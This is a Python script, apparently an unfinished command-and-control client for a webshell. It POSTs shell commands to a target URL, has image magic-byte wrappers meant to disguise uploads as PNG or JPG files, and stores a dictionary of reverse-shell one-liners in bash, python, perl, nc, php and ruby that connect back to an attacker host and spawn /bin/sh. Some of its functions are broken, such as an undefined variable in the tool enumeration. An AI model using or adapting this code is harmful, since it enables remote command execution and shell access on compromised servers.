#!/usr/bin/env python3
#Reworked:
#  Converted to object oreinted
#  Added option for shell in a wrapper
#  Reduced tools query to one webrequest
#Needed:
#  Encryption
#----------------------------------------------------------------------------
#Imports
from argparse import ArgumentParser
from urllib import parse
from base64 import b64encode
from re import search

def installer(program):
  try:
    from pip import main as pipmain
  except:
    print(f"[!] {program} not installed. Installing with pip")
    exit()
  pipmain(['install', program])
  exit()

try:
  from requests import request as http
except:
  installer("requests")
try:
  from termcolor import colored as color
except:
  installer("termcolor")
#----------------------------------------------------------------------------
#Constants
parser = ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="URL to webshell")
parser.add_argument("--wrapper", type=str, required=False, help="Filetype wrapper JPG/PNG")
args = parser.parse_args()

filetypes = {
  'png': {'b': b'89504e470d0a1a0a0000000d49484452', 'e': b'00000049454e44ae426082'},
  'jpg': {'b': b'ffd8ffe000004a46494600', 'e': b'ffd9'}
}

revshells = {
  'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh")\'',
  'bash': 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
  'perl': 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
  'nc': 'nc -nv LHOST LPORT -e /bin/bash', #only works with newer nc version
  'php': 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
  'ruby': 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i")\''
 }

url = args.url
if args.wrapper and args.wrapper not in filetypes.keys():
  print(f"[!] Wrapper not in: {filetypes.keys()}")
  exit()
elif not args.wrapper:
  wrapper = ""
else: wrapper = args.wrapper

#----------------------------------------------------------------------------
#Main operator classes
class cnc(object):
  def __init__(self, url, wrapper, crypto):
    self.url = url
    if wrapper: self.wrapper = wrapper
    #self.tools = self.enumtools()
  def webrequest(self, cmd):
    data = {"content": parse.quote(cmd)}
    return http("POST", self.url, data=data)
  def enumtools(self):
    cmd = f"which {revshells.keys()}"
    self.webrequest(cmd)
    return [v for v in revshells.keys() if search(v, resp)]

#----------------------------------------------------------------------------
#Runcall
run = cnc(url, wrapper, '')
print(run.webrequest("id").raw)

